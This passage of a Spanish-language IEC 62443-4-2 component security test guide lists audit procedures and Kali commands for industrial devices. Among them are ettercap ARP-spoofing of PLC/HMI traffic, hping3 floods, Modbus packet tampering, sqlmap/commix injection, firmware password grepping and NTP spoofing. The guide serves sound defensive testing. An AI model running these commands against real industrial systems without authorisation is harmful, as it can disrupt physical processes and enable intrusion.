    *   [Herramientas]: Lector de logs del sistema (ej. `journalctl`, `cat /var/log/...`), cliente syslog, SIEM.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Syslog Server (Recepción):** `nc -u -l -p 514` (Levantar un listener UDP simple para ver si llegan logs).
> *   **Wireshark:** Filtrar por `syslog` para ver si los eventos se transmiten por la red.



### CR 2.9: Audit storage capacity

**Objetivo:** Gestionar el almacenamiento de logs de auditoría para evitar su pérdida debido al agotamiento del espacio, ya sea sobrescribiendo los registros más antiguos de forma controlada (rotación) o alertando antes de que el almacenamiento se llene.

**PRUEBAS:**

*   **SL1/2:**
    *   **Prueba de Agotamiento de Logs (Log Flooding):** Generar un gran volumen de eventos de auditoría para intentar llenar el almacenamiento de logs local.
    *   **Observación del Comportamiento:** Verificar el comportamiento del sistema cuando el almacenamiento se llena. El comportamiento esperado es la rotación de logs (sobrescribir los más antiguos). Un comportamiento inaceptable sería que el dispositivo dejara de funcionar o detuviera el registro de nuevos eventos.
    *   [Herramientas]: Scripts personalizados, `logger` en un bucle.

*   **SL3/4 (Añade RE 1: Alerta de umbral):**
    *   **Verificación de Alertas:** Verificar que el dispositivo puede ser configurado para generar una alerta (SNMP trap, syslog, email) cuando el uso del almacenamiento de logs alcanza un umbral predefinido (ej. 80% de capacidad).
    *   **Prueba de Alerta:** Simular el llenado del disco y verificar que la alerta se envía correctamente al sistema de monitorización.
    *   [Herramientas]: Receptor de traps SNMP, servidor syslog, `fallocate` para crear ficheros grandes.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Log Flood:** `while true; do logger "Test Log Entry"; done` (Si se tiene shell).
> *   **Network Log Flood:** `hping3 -S -p <puerto_servicio> --flood <IP>` (Para generar logs de conexión masivos).



### CR 2.10: Response to audit processing failures

**Objetivo:** Asegurar que un fallo en el sistema de auditoría (ej. el servicio de logging se cae) no compromete las funciones operativas esenciales del componente y que el fallo es detectado y notificado.

**PRUEBAS:**

*   **SL 1-4:**
    *   **Prueba de Fallo de Logging:** Simular un fallo en el sistema de auditoría. Métodos posibles:
        *   Detener el servicio de logging (ej. `systemctl stop rsyslogd`).
        *   Desmontar la partición de logs (`umount /var/log`).
        *   Llenar el disco al 100%.
        *   Bloquear el tráfico al servidor syslog remoto con un firewall.
    *   **Verificación de Funciones Críticas:** Mientras el sistema de logging está fallando, verificar que las funciones esenciales del componente (ej. control de procesos, comunicación de seguridad) siguen operativas.
    *   **Verificación de Notificación de Fallo:** Comprobar que el sistema detecta el fallo de logging y genera una alerta (ej. un evento en la interfaz de estado, un trap SNMP, un log de "health check").
    *   [Herramientas]: Comandos de sistema (`systemctl`, `umount`, `dd`), iptables.



### CR 2.11: Timestamps

**Objetivo:** Garantizar que todos los registros de auditoría tienen marcas de tiempo precisas, fiables y sincronizadas, lo cual es indispensable para la correlación de eventos durante una investigación de incidentes.

**PRUEBAS:**

*   **SL1:**
    *   **Verificación de Timestamps:** Generar un log y verificar que el timestamp es completo (fecha, hora, segundos y preferiblemente milisegundos y zona horaria/UTC) y se corresponde con el reloj local del sistema.

*   **SL2/3 (Añade RE 1: Sincronización de tiempo):**
    *   **Configuración de NTP:** Verificar que el dispositivo puede ser configurado como cliente NTP para sincronizar su reloj con uno o varios servidores de tiempo de referencia.
    *   **Prueba de Sincronización:** Configurar un servidor NTP, esperar a la sincronización y verificar que los logs se generan con la hora correcta.

*   **SL4 (Añade RE 2: Protección de la fuente de tiempo):**
    *   **Prueba de Resiliencia de Sincronización (NTP):** Simular una pérdida de conexión con el servidor NTP o intentar un ataque de NTP spoofing. Verificar si el sistema detecta la anomalía (ej. un salto de tiempo grande e ilógico), genera una alerta, y es capaz de mantener una hora razonable con su reloj interno.
    *   **Verificación de NTP Autenticado:** Comprobar si el dispositivo soporta NTP autenticado (usando claves simétricas) para prevenir ataques de spoofing.
    *   [Herramientas]: Delorean, NTSke, chrony/ntpdate.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Nmap (NTP Info):** `nmap -sU -p 123 --script ntp-info <IP>`.
> *   **Wireshark:** Analizar paquetes NTP para ver si usan autenticación (MD5/SHA1 hash en el paquete).



### CR 2.12: Non-repudiation

**Objetivo:** Asegurar que los registros de auditoría son lo suficientemente fiables y detallados como para poder atribuir inequívocamente una acción a un individuo o sistema específico, de modo que no puedan negar haberla realizado (no repudio).

**PRUEBAS:**

*   **SL1 a SL3:**
    *   **Atribución de Acciones a Usuarios Humanos:** Realizar una acción crítica (ej. cambio de un setpoint) con un usuario específico. Revisar el log y verificar que el evento está inequívocamente asociado a ese ID de usuario único. El uso de cuentas compartidas invalida este control.

*   **SL4 (Añade RE 1: No repudio para todos los usuarios):**
    *   **Atribución de Acciones a Sistemas:** Verificar que las acciones realizadas por procesos de software automáticos, APIs o comunicaciones entre dispositivos también se registran con un identificador único (ej. nombre del servicio, ID del dispositivo, certificado cliente), garantizando el no repudio.
    *   [Herramientas]: Lector de logs del sistema, SIEM.



### CR 2.13: Use of physical diagnostic and test interfaces

**Objetivo:** Proteger las interfaces de depuración de bajo nivel (JTAG, UART) que, si no están aseguradas, pueden proporcionar a un atacante con acceso físico un control total sobre el dispositivo, permitiéndole extraer firmware, claves y saltarse todas las protecciones de software.

**PRUEBAS:**

*   **SL2:**
    *   **Prueba de Endurecimiento de Puertos de Debug:**
        *   Intentar conectar un depurador a los puertos JTAG/SWD y verificar si están deshabilitados (ej. mediante e-fuses quemados en producción) o protegidos por contraseña.
        *   Conectar a la consola serie (UART) y verificar si el acceso a una shell de login está deshabilitado o, si está activa, requiere autenticación. El acceso de solo lectura a logs de arranque puede ser aceptable.
    *   [Herramientas]: JTAGulator, J-Link, Bus Pirate, adaptador USB-a-UART.

*   **SL3/4 (Añade RE 1: Monitorización activa):**
    *   **Verificación de Detección de Acceso:** Intentar conectar un cable o enviar datos a los puertos de diagnóstico y verificar que esta actividad física o lógica genera un evento de auditoría específico que registra el intento de acceso no autorizado.
    *   [Herramientas]: Lector de logs del sistema.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Screen/Minicom:** `screen /dev/ttyUSB0 115200` (Para conectar a UART).
> *   **OpenOCD:** `openocd -f interface/jlink.cfg -f target/stm32f4x.cfg` (Intentar conectar a JTAG).



## FR 3: System integrity

### CR 3.1: Communication integrity

**Objetivo:** Proteger la integridad de los datos en tránsito, asegurando que los mensajes no puedan ser modificados por un atacante durante la comunicación sin que dicha manipulación sea detectada.

**PRUEBAS:**

*   **SL1:**
    *   **Ataque de Inyección y Modificación de Paquetes:** Capturar tráfico de red (especialmente de protocolos OT no cifrados) y modificar en tránsito los valores de los datos, números de secuencia o checksums. Verificar si el receptor detecta la manipulación (ej. rechaza el paquete, genera un error, o ignora el dato por un CRC/checksum incorrecto).
    *   [Herramientas]: Burp Suite Repeater, Scapy, ettercap.

*   **SL2/3/4 (Añade RE 1: Autenticación de la comunicación):**
    *   **Verificación de Autenticación de Paquetes:** Analizar los paquetes transmitidos e identificar si los datos están protegidos por un código de autenticación de mensaje (HMAC) o una firma digital, que garantizan tanto la integridad como la autenticidad del origen del mensaje, previniendo la manipulación y la suplantación.
    *   [Herramientas]: Wireshark (con disectores de protocolo adecuados).

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Scapy (Python):** Crear script para interceptar paquete Modbus, cambiar valor de registro y recalcular CRC.
> *   **Ettercap:** `ettercap -T -q -M arp:remote /<IP_PLC>// /<IP_HMI>//` (MitM para inyección).



### CR 3.2: Protection from malicious code

**Objetivo:** Implementar mecanismos de defensa para detectar y prevenir la ejecución de software malicioso (malware) que podría comprometer la funcionalidad, seguridad o fiabilidad del componente.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Intento de Carga de Malware:** Intentar subir y ejecutar ficheros maliciosos conocidos o ficheros de prueba de antivirus como EICAR a través de todas las vías posibles (uploads web, FTP, USB, etc.).
    *   **Verificación de Mecanismos de Defensa:** Verificar si existen mecanismos de protección como:
        *   Antivirus o antimalware con firmas actualizadas.
        *   Listas blancas de aplicaciones (AppLocker, etc.) que solo permiten la ejecución de binarios conocidos y autorizados.
        *   Sandboxing o análisis de reputación de ficheros.
        *   El sistema debe bloquear la acción y generar una alerta de seguridad.
    *   [Herramientas]: Fichero de prueba EICAR, Metasploit.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **EICAR:** `echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.com` (Intentar subir este archivo).



### CR 3.3: Security functionality verification

**Objetivo:** Proporcionar una forma para que el dispositivo verifique la correcta operación de sus propias funciones de seguridad, permitiendo la detección temprana de fallos o manipulaciones.

**PRUEBAS:**

*   **SL1 a SL3:**
    *   **Prueba de Autodiagnóstico (Self-Test):** Revisar la documentación y la interfaz para encontrar la función de autodiagnóstico o verificación de seguridad (a menudo llamada "Power-On Self-Test" o POST). Ejecutarla y analizar el informe resultante para asegurar que todas las funciones de seguridad (ej. firewall, sistema de logs, criptografía) son reportadas como operativas.
    *   **Prueba de Fallo Simulado:** Si es posible, deshabilitar o corromper una función de seguridad y ejecutar de nuevo el autodiagnóstico. El sistema debe detectar y reportar el fallo.

*   **SL4 (Añade RE 1: Verificación durante operación normal):**
    *   **Verificación de Monitorización Continua:** Comprobar que estas verificaciones de integridad de las funciones de seguridad se realizan de forma periódica y automática durante la operación normal, sin interrumpir las funciones esenciales del dispositivo, y que cualquier fallo es alertado inmediatamente.
    *   [Herramientas]: Interfaz de gestión del dispositivo.



### CR 3.4: Software and information integrity

**Objetivo:** Asegurar que solo se pueda cargar y ejecutar software, firmware y configuraciones que sean auténticos (del fabricante o propietario) e íntegros (no modificados), previniendo la instalación de versiones maliciosas o troyanizadas.

**PRUEBAS:**

*   **SL1 (Integridad):**
    1.  Exportar un fichero de firmware o configuración oficial.
    2.  Modificar un solo bit del fichero con un editor hexadecimal.
    3.  Intentar cargar el fichero modificado. El dispositivo debe rechazarlo con un error claro de "integridad", "checksum incorrecto" o "fichero corrupto".
    *   [Herramientas]: HxD (Hex Editor), `sha256sum`.

*   **SL2 (Añade RE 1: Autenticidad):**
    1.  Realizar la misma prueba de SL1. El error debería ser más específico, como "firma digital inválida".
    2.  Crear un certificado de firma propio (una "CA atacante") y firmar un fichero de firmware/configuración.
    3.  Intentar cargar este fichero firmado. El dispositivo debe rechazarlo con un error de "firmante no confiable" o "fallo en la validación de la cadena de confianza".
    *   [Herramientas]: OpenSSL.

*   **SL3/4 (Añade RE 2: Notificación automatizada):**
    *   **Verificación de Reporte a SIEM:** Verificar si los intentos fallidos de carga de firmware (tanto por fallo de integridad como de autenticidad) son registrados y reportados a un sistema centralizado de logs o SIEM con una severidad alta.
    *   [Herramientas]: Servidor Syslog, SIEM.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Hexedit:** `hexedit firmware.bin` (Modificar un byte).
> *   **Sha256sum:** `sha256sum firmware.bin` (Verificar cambio de hash).



### CR 3.5: Input validation

**Objetivo:** Prevenir ataques que explotan la confianza del sistema en los datos de entrada, como inyecciones de código (SQLi, XSS, Command Injection) y desbordamientos de búfer, que pueden llevar a la ejecución de código no autorizado, denegación de servicio o exfiltración de datos.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Prueba de Inyecciones Comunes:** Identificar todos los campos de entrada en interfaces web, APIs y protocolos de red y probar inyecciones básicas y avanzadas:
        *   **Web:** Cross-Site Scripting (XSS), SQL Injection (SQLi), Command Injection, XML External Entity (XXE), LDAP Injection, Server-Side Request Forgery (SSRF).
        *   **Protocolos OT:** Enviar paquetes con valores fuera de rango, longitudes de datos incorrectas o function codes inválidos.
    *   **Fuzzing de Interfaces:** Utilizar herramientas de fuzzing para enviar datos malformados de forma masiva a las interfaces de entrada (red, web, API) y monitorizar el sistema en busca de caídas, errores inesperados, reinicios o consumo excesivo de recursos (CPU, memoria).
    *   [Herramientas]: Burp Suite (Scanner y Repeater), sqlmap, commix, ffuf, wfuzz, boofuzz, Scapy.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Sqlmap:** `sqlmap -u "http://<IP>/page.php?id=1" --batch`.
> *   **Commix:** `commix --url="http://<IP>/ping.php?ip=127.0.0.1"`.
> *   **Boofuzz:** Crear script Python para fuzzear protocolo Modbus/TCP.



### CR 3.6: Deterministic output

**Objetivo:** Asegurar que el componente se comporta de una manera predecible y segura cuando se enfrenta a fallos o condiciones inesperadas, evitando estados indeterminados que podrían tener consecuencias peligrosas en un entorno industrial.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Prueba Funcional de Estado Seguro (Failsafe):**
        1.  Revisar la documentación técnica para identificar el comportamiento esperado ante fallos (el "estado seguro").
        2.  Simular condiciones de fallo descritas en la documentación, como:
            *   Pérdida de comunicación con un sensor o actuador.
            *   Recepción de datos fuera de los rangos operativos normales.
            *   Un fallo interno de un subproceso.
        3.  Verificar que el dispositivo se comporta exactamente como se documenta, por ejemplo: mantiene el último valor seguro, pasa a un estado de mínima energía, se reinicia de forma controlada, o activa una alarma.
    *   [Herramientas]: Herramientas de simulación de red (para interrumpir la comunicación), scripts personalizados para inyectar datos anómalos.



### CR 3.7: Error handling

**Objetivo:** Garantizar que los mensajes de error no revelan información sensible sobre la tecnología interna, la configuración o el estado del sistema, ya que esta información podría ser utilizada por un atacante para planificar un ataque más dirigido.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Prueba de Fuga de Información en Errores:** Provocar errores sistemáticamente en todas las interfaces (peticiones web malformadas, parámetros incorrectos, acceso a recursos inexistentes, comandos CLI con sintaxis errónea).
    *   **Análisis de Respuestas de Error:** Verificar que los mensajes de error mostrados al usuario son genéricos y no revelan detalles internos sensibles, tales como:
        *   Rutas de ficheros en el servidor (`/var/www/html/...`).
        *   Versiones de software y librerías (ej. "Apache/2.4.52", "OpenSSL 1.1.1f").
        *   Trazas de pila (stack traces) de lenguajes de programación.
        *   Consultas SQL completas.
    *   [Herramientas]: Burp Suite, ZAP, Nmap (con scripts de fuzzing), Nikto.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Nikto:** `nikto -h <IP>` (Busca errores por defecto y ficheros conocidos).
> *   **Curl:** Enviar caracteres raros `curl http://<IP>/api?id='` y ver respuesta.



### CR 3.8: Session integrity

**Objetivo:** Proteger la integridad de las sesiones de usuario, asegurando que los identificadores de sesión no puedan ser adivinados, secuestrados o manipulados por un atacante para tomar el control de una sesión legítima.

**PRUEBAS:**

*   **SL2 a SL4:**
    *   **Pruebas de Gestión de Sesión:**
        1.  **Secuestro de Sesión (Session Hijacking):** Capturar un ID de sesión (cookie) legítimo e intentar reutilizarlo en otra máquina/navegador para acceder sin autenticarse.
        2.  **Invalidación de Sesión:** Verificar que el ID de sesión se invalida y se elimina en el servidor inmediatamente después de un logout explícito.
        3.  **Prevención de Fijación de Sesión (Session Fixation):** Verificar que el servidor genera un nuevo y diferente ID de sesión después de que el usuario se autentique correctamente.
        4.  **Análisis de Aleatoriedad de Tokens:** Utilizar una herramienta estadística para analizar la aleatoriedad, longitud y complejidad de los IDs de sesión para asegurar que no son predecibles.
        5.  **Verificación de Atributos de Cookies:** Comprobar que las cookies de sesión tienen los atributos de seguridad `Secure` y `HttpOnly` activados.
    *   [Herramientas]: Burp Suite (Repeater y Sequencer), OWASP ZAP.



### CR 3.9: Protection of audit information

**Objetivo:** Proteger la integridad y confidencialidad de los registros de auditoría, evitando que puedan ser modificados o eliminados por un atacante que intente borrar sus huellas.

**PRUEBAS:**

*   **SL2/3:**
    *   **Prueba de Control de Acceso a Logs:** Acceder al dispositivo con un rol no privilegiado (operador, invitado) e intentar leer, modificar o borrar los ficheros de log directamente en el sistema de ficheros. Verificar que los permisos del sistema de ficheros impiden estas acciones (los logs solo deben ser modificables por el usuario root o el servicio de logging).
    *   **Prueba de Inmutabilidad:** Con acceso de root, intentar modificar manualmente un log. Herramientas como `chattr +a` (append-only) deberían usarse para prevenir la modificación de entradas existentes.
    *   [Herramientas]: Cliente SSH/shell, `ls -l`, `chattr`.

*   **SL4 (Añade RE 1: Registros en medios de solo escritura):**
    *   **Verificación de Almacenamiento Inmutable (WORM):** Revisar la documentación del hardware para confirmar si utiliza almacenamiento WORM (Write-Once Read-Many) o si los logs se guardan en un chip de memoria seguro.
    *   **Prueba de Envío Remoto:** Verificar que el dispositivo puede configurarse para enviar logs en tiempo real a un servidor syslog remoto y seguro. Esta es la contramedida más común y efectiva, ya que los logs están fuera del alcance de un atacante que comprometa el dispositivo.
    *   [Herramientas]: Acceso root al dispositivo, servidor syslog.



### CR 3.10: Support for updates

**Objetivo:** Asegurar que el componente dispone de un mecanismo seguro y fiable para aplicar actualizaciones de software y firmware, lo cual es esencial para corregir vulnerabilidades de seguridad a lo largo de su ciclo de vida.

**PRUEBAS:**

*   **SL1:**
    *   **Verificación del Proceso de Actualización:** Verificar que existe un mecanismo documentado y funcional para aplicar actualizaciones de seguridad, ya sea a través de una interfaz web, CLI o un método físico.

*   **SL2/3/4 (Añade RE 1: Autenticidad e integridad de la actualización):**
    *   **Verificación de Integridad y Autenticidad de Actualizaciones:** Realizar las mismas pruebas que para CR 3.4 (Software and information integrity), pero aplicadas específicamente al paquete de actualización. El sistema debe rechazar categóricamente cualquier actualización que haya sido modificada o que no esté firmada digitalmente por el fabricante.
    *   [Herramientas]: HxD, OpenSSL.



### CR 3.11: Physical tamper resistance and detection

**Objetivo:** Implementar medidas físicas para detectar y, opcionalmente, responder a intentos de manipulación física del dispositivo, como la apertura de su carcasa.

**PRUEBAS:**

*   **SL2:**
    *   **Verificación de Mecanismos de Detección Física:** Inspeccionar físicamente el dispositivo en busca de sellos de seguridad que evidencien la apertura, o sensores de intrusión de chasis (pequeños interruptores que se activan al abrir la carcasa).

*   **SL3/4 (Añade RE 1: Notificación de intento de manipulación):**
    *   **Prueba de Disparo de Alarma:** Si existen mecanismos de detección, intentar activarlos (ej. abrir el chasis con el dispositivo encendido) y verificar que se genera una alerta (localmente en una HMI, o remotamente vía SNMP/syslog) y que el evento queda registrado de forma indeleble en los logs de auditoría.
    *   **Respuesta a la Manipulación (Opcional):** Verificar si el dispositivo toma una acción defensiva al detectar la manipulación, como borrar claves criptográficas sensibles (zeroization).
    *   [Herramientas]: Inspección visual, herramientas manuales.



### CR 3.12: Provisioning product supplier roots of trust

**Objetivo:** Asegurar que el dispositivo viene de fábrica con una raíz de confianza (Root of Trust - RoT) del fabricante, preinstalada de forma segura e inmutable, que sirve como ancla para todas las verificaciones de autenticidad de software y actualizaciones (ver CR 3.4 y CR 3.10).

**PRUEBAS:**

*   **SL2/3/4:**
    *   **Validación Indirecta:** Este control se valida principalmente al probar exitosamente CR 3.4 SL-2 (Autenticidad del software). Si el dispositivo es capaz de validar correctamente la firma digital del firmware oficial del fabricante y rechaza firmware firmado por otras entidades, implica que tiene una raíz de confianza del fabricante preinstalada de forma segura.
    *   **Análisis de Firmware (Avanzado):** Extraer el firmware y buscar los certificados públicos de la CA raíz del fabricante para confirmar su presencia.
    *   [Herramientas]: OpenSSL, Binwalk.



### CR 3.13: Provisioning asset owner roots of trust

**Objetivo:** Proporcionar al propietario del activo (la organización que usa el dispositivo) la capacidad de instalar su propia raíz de confianza, permitiéndole firmar y validar sus propias configuraciones o software personalizado.

**PRUEBAS:**

*   **SL2/3/4:**
    *   **Prueba de Gestión de Autoridades de Confianza (CAs):**
        1.  Buscar en la interfaz de administración una sección para la "Gestión de Certificados", "Almacén de Confianza" o "Autoridades de Certificación (CAs)".
        2.  Verificar que existe una función para que un administrador pueda importar el certificado público de la CA de su organización.
        3.  (Opcional) Si es posible, firmar un fichero de configuración con la CA de la organización e intentar cargarlo. El dispositivo debería aceptarlo si la CA ha sido importada como confiable.
    *   [Herramientas]: OpenSSL (para crear la CA y firmar), interfaz de gestión del dispositivo.



### CR 3.14: Integrity of the boot process

**Objetivo:** Garantizar que el proceso de arranque del dispositivo es seguro y que cada componente cargado (bootloader, kernel, sistema de ficheros) es verificado criptográficamente antes de su ejecución. Esto previene la ejecución de firmware modificado maliciosamente (bootkits, rootkits).

**PRUEBAS:**

*   **SL1 (Integridad):**
    *   **Verificación de Checksum de Arranque:** El dispositivo debe, como mínimo, verificar la integridad de su firmware/software (ej. con un CRC o hash) antes de usarlo. Esto puede ser visible en los logs de arranque.

*   **SL2/3/4 (Añade RE 1: Autenticidad del proceso de arranque - Secure Boot):**
    *   **Análisis de Logs de Arranque (Secure Boot):** Revisar los mensajes de la consola de arranque (vía UART) en busca de menciones explícitas a "Secure Boot", "Verifying signature", "Bootloader integrity check", "Chain of Trust".
    *   **Prueba de Modificación de Componentes Críticos (Avanzada y potencialmente destructiva):**
        1.  Con acceso al sistema de ficheros (posiblemente desoldando el chip de memoria), modificar un componente crítico de la cadena de arranque (ej. el bootloader, el kernel, un driver esencial).
        2.  Volver a ensamblar el dispositivo y reiniciarlo.
    *   **Verificación de Fallo de Arranque Seguro:** Un sistema con un arranque seguro funcional debe negarse a arrancar el software modificado. Debería detenerse, entrar en un modo de recuperación seguro o mostrar un error claro de fallo de integridad/firma en la consola.
    *   [Herramientas]: Adaptador USB-a-UART, programador de memorias flash, HxD.



## FR 4: Data confidentiality

### CR 4.1: Information confidentiality

**Objetivo:** Proteger la confidencialidad de la información sensible, tanto cuando está siendo transmitida por la red (en tránsito) como cuando está almacenada en el dispositivo (en reposo), mediante el uso de cifrado.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Verificación de Cifrado en Tránsito:** Capturar tráfico de red durante operaciones que manejen datos sensibles (autenticación, envío de configuración, datos de proceso). Verificar que todos estos datos viajan cifrados usando protocolos robustos (TLS 1.2+, SSHv2, IPsec). La presencia de protocolos en texto plano como Telnet, FTP o HTTP para gestión es un fallo directo.
    *   **Verificación de Cifrado en Reposo:** Obtener acceso al sistema de ficheros (extrayendo el firmware o con una shell). Localizar y examinar ficheros que puedan contener datos sensibles (configuraciones, credenciales, claves privadas, logs). Verificar que esta información está cifrada y no es legible en texto plano.
    *   [Herramientas]: Wireshark, testssl.sh, Binwalk, grep, strings.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Strings:** `strings firmware.bin | grep -i "password"` (Buscar texto plano).
> *   **Wireshark:** Filtrar por `tcp.port == 23` (Telnet) o `tcp.port == 21` (FTP) para detectar tráfico no cifrado.



### CR 4.2: Information persistence

**Objetivo:** Asegurar que la información sensible puede ser eliminada de forma segura y permanente del dispositivo (purgado) cuando ya no es necesaria o al final del ciclo de vida del equipo, para prevenir la recuperación de datos por medios forenses.

**PRUEBAS:**

*   **SL2 (Purgado Completo):**
    1.  Configurar el dispositivo con datos sensibles (credenciales de red, configuraciones específicas).
    2.  Ejecutar la función de "restablecimiento de fábrica" o "borrado seguro" proporcionada por el fabricante.
    3.  Verificar que todos los datos de configuración han sido eliminados y el dispositivo ha vuelto a su estado inicial de fábrica.

*   **SL3 (Añade RE 1: Borrado de memoria compartida/volátil):**
    1.  Conectar un depurador de hardware (JTAG/SWD) si es posible.
    2.  Cargar datos sensibles en la memoria RAM (ej. a través de una operación normal).
    3.  Ejecutar la función de purgado de memoria o reiniciar el dispositivo.
    4.  Inspeccionar la memoria RAM después del reinicio para verificar que las áreas de memoria han sido sobrescritas (ej. con ceros) y que no quedan restos de los datos sensibles.

*   **SL4 (Añade RE 2: Verificación de borrado):**
    1.  Ejecutar el purgado de SL-2.
    2.  Buscar un log o un mensaje en la interfaz que certifique que el borrado seguro se completó exitosamente.
    3.  **Prueba Forense (Avanzada):** Desoldar el chip de memoria flash, hacer un volcado completo de su contenido y usar herramientas forenses para intentar recuperar fragmentos de la configuración antigua (carving). La ausencia de datos recuperables confirma un purgado efectivo.
    *   [Herramientas]: JTAG debugger, estación de aire caliente, programador de memorias, Binwalk, Photorec, Autopsy.



### CR 4.3: Use of cryptography

**Objetivo:** Asegurar que el componente utiliza algoritmos criptográficos modernos y aprobados por la industria, y que evita el uso de algoritmos débiles u obsoletos que son vulnerables a ataques conocidos.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Análisis de Protocolos y Algoritmos Criptográficos:** Escanear todos los servicios de red que utilizan criptografía (HTTPS, SSH, VPN, etc.) para identificar los protocolos, suites de cifrado (cipher suites), algoritmos de hash y longitudes de clave utilizados.
    *   **Verificación de Estándares:** Comprobar que:
        *   Se utilizan versiones de protocolo seguras: TLS 1.2 o 1.3, SSHv2.
        *   Se deshabilitan versiones inseguras: SSLv2, SSLv3, TLS 1.0, TLS 1.1.
        *   Se utilizan algoritmos de cifrado fuertes: AES-128/256 (GCM, CBC).
        *   Se deshabilitan cifrados débiles: DES, 3DES, RC4, Blowfish.
        *   Se utilizan algoritmos de hash seguros: SHA-2 (SHA-256, SHA-384, SHA-512).
        *   Se deshabilitan hashes débiles: MD5, SHA-1.
        *   Se utilizan longitudes de clave adecuadas: RSA >= 2048 bits, ECDSA >= 256 bits.
    *   [Herramientas]: testssl.sh, sslscan, Nmap (`ssl-enum-ciphers` script), Wireshark.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Testssl.sh:** `testssl.sh --protocols --cipher-per-proto <IP>` (Verificar protocolos y cifrados).
> *   **Nmap:** `nmap --script ssh2-enum-algos <IP>` (Para SSH).



## FR 5: Restricted data flow

### CR 5.1: Network segmentation

**Objetivo:** Verificar que el componente proporciona las capacidades técnicas necesarias para ser integrado en una arquitectura de red segmentada (Defensa en Profundidad), permitiendo el aislamiento de redes y el control del tráfico entre zonas de seguridad. La correcta implementación y configuración de estas capacidades se evalúa en 62443-3-3.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Prueba de Soporte de Segmentación (VLAN):** Identificar si las interfaces de red del dispositivo soportan el etiquetado de tráfico según el estándar 802.1Q (VLANs).
    *   **Prueba de Aislamiento:** Si el componente tiene múltiples interfaces de red (ej. una para la red de control y otra para la de gestión), verificar que por defecto no enrutan tráfico entre ellas y que el tráfico de una zona no puede alcanzar otra zona no autorizada a través del dispositivo.
    *   [Herramientas]: Nmap, hping3, configuración de un switch gestionable para crear VLANs de prueba.



### CR 5.2: Zone boundary protection

**Objetivo:** Comprobar que el componente (si actúa como un dispositivo de frontera, como un firewall o un router) tiene la capacidad de filtrar el tráfico de red basándose en políticas de seguridad, siguiendo un principio de "denegar por defecto".

**PRUEBAS:**

*   **SL2 (Añade RE 1: Denegar por defecto):**
    *   **Prueba de Denegación por Defecto:** Verificar que la política por defecto del firewall/ACL del dispositivo es denegar todo el tráfico que no esté explícitamente permitido en una regla.
    *   **Prueba de Creación de Reglas:** Crear una regla que permita un tráfico específico (ej. TCP puerto 502 desde una IP concreta) y otra que lo deniegue. Verificar que las reglas se aplican correctamente y en el orden esperado.

*   **SL3/4 (Añade RE 2 y 3: Modo Isla y Fallo Cerrado):**
    *   **Prueba de Modo Aislamiento ("Modo Isla"):** Si el dispositivo soporta esta función, activarla y verificar que todo el tráfico que cruza el límite de zona es bloqueado instantáneamente.
    *   **Prueba de Fallo Cerrado (Fail-Close):** Simular un fallo del dispositivo (reinicio inesperado, caída del servicio de firewall) y verificar que, durante el arranque o el fallo, el estado por defecto de las reglas es bloquear todo el tráfico hasta que el servicio de filtrado se restaure completamente.
    *   [Herramientas]: Nmap, hping3, interfaz de gestión del firewall.

> 🛠️ **Herramientas y Comandos (Kali Linux / Hardware):**
> *   **Hping3 (Prueba de ACL):** `hping3 -S -p 80 -c 1 <IP>` (Verificar si pasa o es droppeado).
> *   **Nmap (Escaneo de firewall):** `nmap -sA <IP>` (Detectar reglas de filtrado ACK).



### CR 5.3: General purpose person-to-person communication restrictions

**Objetivo:** Asegurar que los componentes de control industrial, que no están diseñados para ello, no permiten comunicaciones de propósito general (como email, chat, redes sociales) que puedan ser utilizadas como vector de ataque o para la exfiltración de datos.

**PRUEBAS:**

*   **SL1 a SL4:**
    *   **Prueba de Bloqueo de Servicios Generales:** Si el componente tiene capacidades de firewall (ver CR 5.2), verificar que es posible crear reglas para bloquear el tráfico saliente en puertos comúnmente asociados a:
        *   Email (25, 587, 465, 110, 995, 143, 993).
        *   Mensajería instantánea (5222, 6667).
        *   Otros servicios de Internet (DNS a servidores públicos, etc.).
    *   **Análisis de Tráfico por Defecto:** Monitorizar el tráfico de red generado por el dispositivo en su estado por defecto para asegurar que no intenta establecer conexiones a servicios de Internet no relacionados con su función.
    *   [Herramientas]: Nmap, Wireshark.



## FR 6: Timely response to events

### CR 6.1: Audit log accessibility

**Objetivo:** Garantizar que los registros de auditoría están disponibles para el personal autorizado cuando los necesitan, y que pueden ser accedidos de forma programática para su centralización y análisis automático en un SIEM.

**PRUEBAS:**

*   **SL1/2:**
    1.  **Verificación de Acceso a Logs:** Confirmar que existe un método documentado para que un usuario con los permisos adecuados (ej. rol de auditor) pueda acceder y leer los logs (ya sea a través de una interfaz web, exportación de ficheros o acceso CLI).
    2.  **Prueba de Control de Acceso:** Intentar acceder a los logs con un rol sin privilegios y verificar que el acceso es denegado.

*   **SL3/4 (Añade RE 1: Acceso programático):**
    1.  **Verificación de Centralización de Logs:** Comprobar que el componente puede ser configurado para enviar sus logs en tiempo real a un sistema centralizado utilizando un protocolo estándar (ej. Syslog, SNMP traps).
    2.  **Prueba de Envío a SIEM:**
        *   a) Configurar el dispositivo para que envíe sus logs a un servidor syslog de prueba.
        *   b) Realizar una acción auditable en el dispositivo (ej. un login fallido).
        *   c) Verificar que el evento aparece en el servidor syslog en un tiempo razonable y en un formato parseable (ej. CEF, LEEF o texto plano estructurado).
